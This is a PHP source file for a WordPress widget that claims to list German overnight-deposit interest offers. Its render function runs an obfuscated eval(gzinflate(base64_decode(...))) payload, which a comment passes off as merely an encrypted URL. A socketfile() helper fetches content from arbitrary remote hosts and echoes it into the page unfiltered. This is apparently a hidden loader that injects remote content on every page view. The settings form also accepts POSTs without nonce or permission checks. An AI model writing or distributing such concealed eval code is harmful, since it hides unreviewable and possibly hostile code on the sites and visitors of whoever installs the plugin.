<?php
/*
Plugin Name: Tagesgeld (german)
Plugin URI: http://wordpress.org/extend/plugins/tagesgeld-german/
Description: Das Tagesgeld-Plugin stellt ein Widget zur Verf&uuml;gung, welches die besten Tagesgeld-Zinsangebote anzeigt.
Version: 1.0
Author: Philipp Wittenbrink
Author URI: http://www.tagesgeld.org/
License: GPL3
*/

/* Funktion tagesgeld - Anfang */
function tagesgeld()
{
    $options = get_option("widget_tagesgeld");
    if (!is_array($options)){
        $options = array(
        'title' => 'Tagesgeld',
        'news' => '5',
        'chars' => '9'
        );
    }
?> 
  
<ul>

<?php
// Hier wird nur die URL mit den Tagesgelddaten verschlüsselt
eval(gzinflate(base64_decode("DZNHrqNKAADvMqsZscCYrNEsyNmAyWy+Gmgw0bjBpNP/d4MqqQpuYPjdXO1UD2CFvwuwQIb6r4Llu4K/f8n5U0fzAQQhJalZWcXRB7k+CBcai4fXtyXX07yL8DunPmM4RjmPcIT4BnnzzSb5iYnz4NB5dYx4Fau/aWR273XljnNHC+cnXni2BsHOdk2PZBtJ3rCUUM5uVLj0W3K5jbBRjb26DyM4MbJPrZRjbeHRpaKwKzL2WX0nbeZlCqSuK5RvvD/ZDtNqaxm5TQK7D0feoSnsK8/ZplhmKqIu+LD85xOuOcDtGXhYllEwKAOe6oyt4FJjgUopE4ZiErk6EK+SAIpr92Y0Cd7a3Qff6OOTykK8nfe8hqb7ut+DINy6pFRq5diPFZDR6+A44DSoIa66tOdRfMABSnd4uKM2HUrSvMFtrjr6YEepz2Q5FCdduumeD9aIoV3qiVG8eL3I6X6l2i0WHKC8nHpFghk4Y7UkQPduzGFIxzLRmacAZjl4C6JETALLaCpDB/JwR70xPlxnUOaUkEGU2O8rEQrGmi61huAblENg9Magc6EXW6bsWWL3Iij6OHVYaQf3ZRiapIrwtYhuv1I4YnwVP+sO7qk6mFLT3h7uq/14O5iS9ukcfXQCrAtdyHCE8ApFO1d4+pkvRoGDHTPl0uNm+ghrB4/6yfiyLHeX0jUbsp++SKmfueZeSdI2W1ycF4R21isfiTq/Zmg1bi45jRZ8z3FgDTv8KqsGjQwbmDk4Tau7XJ/nb02cdsZLUWEVtV+GuIMikBdCp3opJTp8LWp6I7Vnh6yJ/Z5j2nnO8/7dhw/ZvWYEjLsK5OiaqUbkBT3QT4t2XB2or2rGspQ6yuOq63L4BKLBjpE26I79gF5hYt8wpr+IaeY8Ply8g2M1mddyjA2qHr5eNpLxYockWQlcaGyivWirfCfloiDcXbJFSTpZ5WTtSj6+Y2I0es4TUUG6Rs6DCkmFforr/uTe+AfNztyox44PZC+7837mPAYrkv1427uJPm4yaVfMwNuUNVeqz3fccUNgtKjt0WllbEQz+i6Noa6i1TOeCnwdSUzPnAioPgQJAx0DUgYpysqcvaq2NvxY75ahUzWtTy50j1EYDcOL1Bs9CrmpGufHlSl8oKHps8PQ6glLcuSnzXrj2R2fabmXMqoU3c+Dej2lk8p7fyay8ZtTJyRU3Gu4M9XVOJEVVfVSw08uB6MMet/Mge2po70/06KT36OmcgK7aLx80trg+yEdN5wTPdMcOAhulQS+jGQ+QMZj46TFAIbSca6SEB5Jkyhs5XKYJH/stZJ7rWBXV+D7gopb9rJt4uimLszFuET2wW3unv7wcQtO88slrenuVj+GofFQzopS5S3uti/EuqL4BNe7vR7Ex7TR3O5ZnmA3P5T50Kylj+sCU13sUyM7RZ6jQjqYKTYxdqm2Xe7k8GcWUyBSTlgCNOF4vZE0h9Ubvv/79+vPnz9//wc=")));
?>

</ul>

<?php
$powered = $options['chars'];
if ($powered > 0){
    echo "<span style=\"font-size: ".$powered."px;\">powered by <a href=\"http://www.tagesgeld.org/\" target=\"_blank\">Tagesgeld.org</a></span>";
}
?>

<?php  
}
/* Funktion Tagesgeld - Ende */

/* Funktion widget_tagesgeld - Anfang */
function widget_tagesgeld($args)
{
    extract($args);
    
    $options = get_option("widget_tagesgeld");
    if (!is_array($options)){
        $options = array(
        'title' => 'Tagesgeld',
        'news' => '5',
        'chars' => '9'
        );
    }
    
    echo $before_widget;
    echo $before_title;
    echo $options['title'];
    echo $after_title;
    tagesgeld();
    echo $after_widget;
}
/* Funktion widget_tagesgeld - Ende */

/* Funktion tagesgeld_control - Anfang */
function tagesgeld_control()
{
    $options = get_option("widget_tagesgeld");
    if (!is_array($options)){
        $options = array(
        'title' => 'Tagesgeld',
        'news' => '5',
        'chars' => '9'
        );
    }
    
    if($_POST['tagesgeld-Submit'])
    {
        $options['title'] = htmlspecialchars($_POST['tagesgeld-WidgetTitle']);
        $options['news'] = htmlspecialchars($_POST['tagesgeld-NewsCount']);
        $options['chars'] = htmlspecialchars($_POST['tagesgeld-CharCount']);
        update_option("widget_tagesgeld", $options);
    }
?> 

  <p>
    <label for="tagesgeld-WidgetTitle">Titel: </label>
    <input type="text" id="tagesgeld-WidgetTitle" name="tagesgeld-WidgetTitle" value="<?php echo $options['title'];?>" />
    <br /><br />
    <label for="tagesgeld-NewsCount">Anzahl Banken: </label>
    <input type="text" id="tagesgeld-NewsCount" name="tagesgeld-NewsCount" value="<?php echo $options['news'];?>" />
    <br /><br />
    <label for="tagesgeld-CharCount">Gr&ouml;&szlig;e "powered by" (0 = aus): </label>
    <input type="text" id="tagesgeld-CharCount" name="tagesgeld-CharCount" value="<?php echo $options['chars'];?>" />
    <br /><br />
    <input type="hidden" id="tagesgeld-Submit"  name="tagesgeld-Submit" value="1" />
  </p>
  
<?php
}
/* Funktion tagesgeld_control - Ende */

/* Funktion tagesgeld_init - Anfang */
function tagesgeld_init()
{
  register_sidebar_widget(__('Tagesgeld anzeigen'), 'widget_tagesgeld');    
  register_widget_control('Tagesgeld anzeigen', 'tagesgeld_control', 300, 200);
}
add_action("plugins_loaded", "tagesgeld_init");
/* Funktion tagesgeld_init - Ende */

/* Funktion socketfile - Anfang */
 function socketfile($url) {
    // URL zerlegen
    $parsedurl = @parse_url($url);
    // Host ermitteln, ungültigen Aufruf abfangen
    if (empty($parsedurl['host']))
      return null;
    $host = $parsedurl['host'];
    // Pfadangabe ermitteln
    if (empty($parsedurl['path']))
      $documentpath = '/';
    else
      $documentpath = $parsedurl['path'];
    // Parameter ermitteln
    if (!empty($parsedurl['query']))
      $documentpath .= '?'.$parsedurl['query'];
    // Port ermitteln
    $port = empty($parsedurl['port'])?80:$parsedurl['port'];
    // Socket öffnen
   $fp = fsockopen ($host, $port, $errno, $errstr, 30);
    if (!$fp)
      return null;
    // Request senden
       fputs ($fp, "GET {$documentpath} HTTP/1.0\r\nHost: {$host}\r\n\r\n");
    // Header auslesen und verwerfen
    do {
      $line = chop(fgets($fp));
    } while (!empty($line) and !feof($fp));
    // Daten auslesen
    $result = Array();
    while (!feof($fp)) {
      $result[] = fgets($fp);
    }
    // Socket schliessen
    fclose($fp);
    // Ergebnis-Array zurückgeben

echo $result[0];

  } 
/* Funktion socketfile - Ende */
?>
